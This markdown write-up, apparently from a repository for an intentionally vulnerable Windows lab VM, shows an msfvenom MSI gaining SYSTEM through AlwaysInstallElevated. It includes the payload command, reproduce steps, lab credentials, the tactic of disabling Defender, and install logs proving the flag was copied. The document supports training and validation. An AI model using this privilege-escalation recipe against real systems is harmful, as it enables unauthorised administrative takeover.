# CysVulnServer — msfvenom AIE validation (User_Joe POV)

End-to-end demonstration that a stock
[msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
MSI elevates to `SYSTEM` via `AlwaysInstallElevated` on this box. The
attacker tool that the player-walkthrough recipe at
[walkthrough.md](walkthrough.md) phase 7 always implied but was never
actually exercised in tree before this writeup. Companion to
[winpeas.md](winpeas.md) / [sharpup.md](sharpup.md) (enumeration) and
[scripts/validate/check_aie_response.py](../../scripts/validate/check_aie_response.py)
(wixl-based probe used by the chain validator).

| Field | Value |
|---|---|
| Tool | `msfvenom` (Metasploit framework 6.4.106, via [kali.nix](../../kali.nix)) |
| Payload | `windows/exec` (x86), `EXITFUNC=thread`, 274 bytes shellcode |
| MSI output | 159744 bytes (`-f msi`) |
| CMD | `cmd /c copy C:\Users\Administrator\Desktop\root.txt C:\Users\Public\aie-msfvenom-flag.txt` |
| Run date | 2026-05-25 03:01 UTC |
| Target | local QEMU CysVuln build (`127.0.0.1:15985` WinRM, `127.0.0.1:13389` RDP) |
| Trigger identity | `WIN-UB5Q52138VG\User_Joe` (PsExec `-i 2` into existing RDP session) |
| Transport | Administrator WinRM (stage MSI) -> PsExec `-i` (interactive Joe) -> `msiexec /quiet /norestart /i ... /l*v ...` |
| Wrapper | [scripts/run-msfvenom-aie.sh](../../scripts/run-msfvenom-aie.sh) |
| Raw log | `artifacts/cysvuln/msfvenom-aie-<timestamp>.log` (gitignored) |

## Reproduce

```bash
nix develop .#kali                            # metasploit + pywinrm
./scripts/run-local-cysvuln.sh                # boot the VM (separate term)
./scripts/cysvuln-local-prep.sh 127.0.0.1     # first boot only
./scripts/run-msfvenom-aie.sh 127.0.0.1
```

Env knobs (mirror [run-sharpup.sh](../../scripts/run-sharpup.sh) where it
makes sense):

| Env | Default | Purpose |
|---|---|---|
| `WINRM_PORT` | `15985` | Forwarded WinRM port on host |
| `RDP_PORT` | `13389` | Forwarded RDP port (interactive Joe bootstrap) |
| `ADMIN_PW` | `PizzaMan123!` | Administrator password (WinRM staging transport) |
| `JOE_USER` | `User_Joe` | Account `msiexec` runs as |
| `JOE_PW` | `VeryStrongPassword123!@#` | `JOE_USER` password (PsExec `-u`) |
| `MSF_PAYLOAD` | `windows/exec` | `msfvenom -p` value |
| `MSF_CMD` | copy root.txt -> aie-msfvenom-flag.txt | `CMD=` value |
| `MSF_EXITFUNC` | `thread` | `EXITFUNC=` value |
| `MSF_LOCAL` | `/tmp/aie-msfvenom-<ts>.msi` | Attacker-side MSI output |
| `MSF_MSI_VICTIM_PATH` | `C:\Users\Public\aie-msfvenom-payload.msi` | Victim install path |
| `MSF_FLAG_VICTIM_PATH` | `C:\Users\Public\aie-msfvenom-flag.txt` | Victim drop the deferred CA writes |
| `MSF_LOG_VICTIM_PATH` | `C:\Users\Public\aie-msfvenom-joe.log` | Victim `msiexec /l*v` log |
| `MSF_HOST_FROM_GUEST` | `10.0.2.2` | Guest -> attacker gateway (QEMU user-net) |
| `MSF_SERVE_PORT` | `0` | Local HTTP staging port (0 = OS-picked free port) |
| `MSF_KEEP` | `0` | Leave MSI + flag + log on the victim after run |
| `MSF_POLL_TIMEOUT` | `120` | Seconds to wait for the flag drop |
| `MSF_LOG` | `artifacts/cysvuln/msfvenom-aie-<ts>.log` | Attacker log path |

## Why this validates the AIE finding

```mermaid
flowchart LR
    kali["nix develop .#kali"] -->|msfvenom -p windows/exec| msi[aie-msfvenom-payload.msi]
    msi -->|HTTP stage 10.0.2.2 -> guest| victim["C:\Users\Public\"]
    victim -->|PsExec -i sid User_Joe| msiexec["msiexec /quiet /norestart /i ... /l*v ..."]
    msiexec -->|AIE elevates msiexec to SYSTEM| ca[deferred CustomAction ExecPayload]
    ca -->|copy SYSTEM-readable file| drop[aie-msfvenom-flag.txt == root.txt]
```



The receipt is unambiguous: `User_Joe` cannot read
`C:\Users\Administrator\Desktop\root.txt` directly (NTFS ACL denies). A
User_Joe-launched `msiexec` that successfully copies that file to a
public-writable path is only possible because Windows Installer ran in
`SYSTEM` context — the canonical `AlwaysInstallElevated` consequence
that [audit_aie.py](../../scripts/validate/audit_aie.py) predicts from
the registry posture.

## Execution model

Same Administrator-WinRM bootstrap as the winPEAS/SharpUp runners, but
the trigger context is **different**:

| Step | Mechanism | Why |
|---|---|---|
| Stage MSI on victim | Administrator WinRM + temp HTTP server on the host (OS-picked free port) | Avoids the WinRM `MaxEnvelopeSize` 413 limit on base64 uploads; same pattern as [run-sharpup.sh](../../scripts/run-sharpup.sh). |
| Trigger msiexec | PsExec `-i <sid>` into an existing RDP session for `User_Joe` | `msiexec` returns **1601** (installer service access denied) for non-interactive logon types — see Phase 7 callout at [walkthrough.md](walkthrough.md). Task Scheduler is therefore a dead-end here, even though it works fine for enumerator binaries like winPEAS / SharpUp. |
| Poll for evidence | Administrator WinRM read of `aie-msfvenom-flag.txt` + cross-check vs `root.txt` | Cheap, reuses [run_aie_as_joe_interactive.py](../../scripts/validate/run_aie_as_joe_interactive.py)'s `poll_flag` (now parameterised over the flag/log paths). |

If `User_Joe` does not already have an interactive session,
[run_aie_as_joe_interactive.py](../../scripts/validate/run_aie_as_joe_interactive.py)
spawns `xfreerdp` as a one-shot bootstrap and tears it down after the
trigger.

## Payload analysis

`msfvenom -p windows/exec CMD='...' EXITFUNC=thread -f msi` produces:

- A 274-byte x86 shellcode that calls `WinExec("...", SW_HIDE)` with the
  literal `CMD` string built on the stack at runtime, then returns to
  the calling thread (`EXITFUNC=thread` — important; `process` would
  kill `msiexec.exe` mid-install and risk the SYSTEM token never
  completing the spawn).
- A 159 744-byte MSI wrapping the shellcode inside a `Binary` table row
  and emitting two custom actions in the install sequence:
  - `ExecPayload` (type `3266` = msidbCustomActionTypeBinaryData |
    msidbCustomActionTypeDll | msidbCustomActionTypeInScript | deferred
    SYSTEM impersonation off) — runs the shellcode in the SYSTEM-context
    deferred-execution thread.
  - `FailInstallation` (type `3110`) — deliberately aborts the install
    with return code 3 so msiexec exits `1603` cleanly without
    committing the (intentionally bogus) MSI tables. This is by design
    and is **not** an elevation failure; the deferred `ExecPayload`
    has already run by the time `FailInstallation` fires.

Compare to the wixl probe at
[scripts/validate/templates/aie-trigger.wxs.j2](../../scripts/validate/templates/aie-trigger.wxs.j2),
which avoids `FailInstallation` and produces a clean exit 0 because it
uses a real (no-op) `File` install plus a `CmdExe` deferred CustomAction
— easier to read in MSI logs, harder to mistake for a generic Windows
Installer failure. Both prove the same thing; msfvenom is the path a
real attacker would actually take.

## Headline findings

End-to-end success — `aie-msfvenom-flag.txt` contents match `root.txt`,
confirming the deferred CustomAction ran as SYSTEM and accessed an
NTFS-ACL-protected file User_Joe cannot otherwise read.

```
=== flag ===
flag{cysvuln-root-local-test}

=== matching CustomActionSchedule / Machine install lines ===
MSI (s) (B4:10) [03:01:22:879]: Executing op: CustomActionSchedule(Action=ExecPayload,ActionType=3266,Source=BinaryData,,)
MSI (s) (B4:10) [03:01:22:895]: Executing op: CustomActionSchedule(Action=FailInstallation,ActionType=3110,Source=fail,,)
Action ended 3:01:24: InstallFinalize. Return value 3.
Action ended 3:01:24: INSTALL. Return value 3.
MSI (s) (B4:10) [03:01:25:082]: MainEngineThread is returning 1603
MSI (c) (94:04) [03:01:25:133]: MainEngineThread is returning 1603
```

PsExec banner from the attacker terminal (note `error code 1603` — see
[Limitations](#limitations) below):

```
PsExec v2.43 - Execute processes remotely
Connecting to localhost...
Starting PSEXESVC service on localhost...
Connecting with PsExec service on localhost...
Starting cmd.exe on localhost...
cmd.exe exited on localhost with error code 1603.
[*] PsExec msiexec finished (-i 2)
aie-flag: flag{cysvuln-root-local-test}
root.txt: flag{cysvuln-root-local-test}
[+] AIE privesc confirmed via interactive User_Joe
```

Concurrent registry posture for context (matches the wixl-based
[audit_aie.py](../../scripts/validate/audit_aie.py) output):

```
HKLM AIE = 1
HKCU AIE (User_Joe hive, via --profile-user) = 1
ConsentPromptBehaviorAdmin = 0
PromptOnSecureDesktop = 0
```

### What you should NOT see in the log

```
1601    "The Windows Installer service could not be accessed" (non-interactive logon)
1625    "This installation is forbidden by system policy"
Access Denied / Permission denied / not elevated
```

A run with any of those in the `msiexec /l*v` log means AIE is **not**
exploitable in that context (typical causes: triggered via scheduled
task / WinRM session / non-interactive logon, or `AlwaysInstallElevated`
got reverted in one of the hives).

## Limitations

- **1603 is expected, not a failure.** msfvenom's MSI template
  deliberately fails the install after running the deferred payload
  (`FailInstallation` custom action with `ActionType=3110`). The
  attacker-side log will always show `MainEngineThread is returning 1603`
  and PsExec will report `cmd.exe exited on localhost with error code
  1603`. The deferred CustomAction already ran in SYSTEM context by that
  point — verify success via the flag drop, not the exit code.
- **Interactive logon required.** This box rejects `msiexec` started
  from a WinRM remote shell or a scheduled task with `Return Value 3 /
  error 1601`. The runner therefore requires either an existing
  `User_Joe` interactive session (RDP / EFS callback / console) or a
  working `xfreerdp` bootstrap. Defender's interactive-restriction is
  the cross-cutting reason msfvenom MSIs are still effective despite
  Microsoft's various AIE mitigations.
- **Defender posture.** `provisioning/powershell/bootstrap_cysvuln.ps1`
  fully disables Defender real-time + cloud submission for this build
  (see the `Defender must be fully neutered: msfvenom payloads are
  detected on contact.` comment in that file). On a default Server 2016
  install the unencoded `windows/exec` shellcode would trip a generic
  Meterpreter signature before execution.
- **EXITFUNC=thread, not process.** `EXITFUNC=process` calls
  `ExitProcess` after the payload, which would terminate `msiexec.exe`
  mid-install and can leave the install state machine wedged. `thread`
  returns to the deferred-CA thread, which lets Windows Installer
  unwind cleanly through `FailInstallation`.
- **x86 payload on x64 OS.** `msfvenom` chooses `x86` by default because
  `windows/exec` has an `x86`-only stub; the MSI itself is architecture
  neutral and SysWOW64 hosts the resulting `cmd.exe`. Pass `-a x64 -p
  windows/x64/exec` if you specifically want a 64-bit payload — no
  functional difference on this box.
- **The chain validator still uses wixl.**
  [scripts/validate-cysvuln-chain.sh](../../scripts/validate-cysvuln-chain.sh)
  intentionally stays on the wixl-built MSI from
  [check_aie_response.py](../../scripts/validate/check_aie_response.py)
  so the repo-level CI does not depend on the heavy
  `nix develop .#kali` shell. This runner is the
  player-tooling demonstration, not the validator-of-record.

## Cross-references

- [docs/cysvulnserver/walkthrough.md](walkthrough.md) — full player chain (Phase 7 documents the msiexec interactive-logon constraint)
- [docs/cysvulnserver/winpeas.md](winpeas.md), [docs/cysvulnserver/sharpup.md](sharpup.md) — enumeration tools that flag AIE before this runner exploits it
- [scripts/validate/audit_aie.py](../../scripts/validate/audit_aie.py) — registry-only AIE indicator (the prediction this runner confirms)
- [scripts/validate/check_aie_response.py](../../scripts/validate/check_aie_response.py) — wixl-based MSI builder used by the chain validator
- [scripts/validate/templates/aie-trigger.wxs.j2](../../scripts/validate/templates/aie-trigger.wxs.j2) — the wixl probe template for side-by-side comparison
- [scripts/validate/run_aie_as_joe_interactive.py](../../scripts/validate/run_aie_as_joe_interactive.py) — PsExec/RDP interactive trigger (`--msi-path` / `--flag-path` / `--log-path` make it tool-agnostic)
- [scripts/run-msfvenom-aie.sh](../../scripts/run-msfvenom-aie.sh) — wrapper for this writeup
- [kali.nix](../../kali.nix) — provides `metasploit` in `nix develop .#kali`
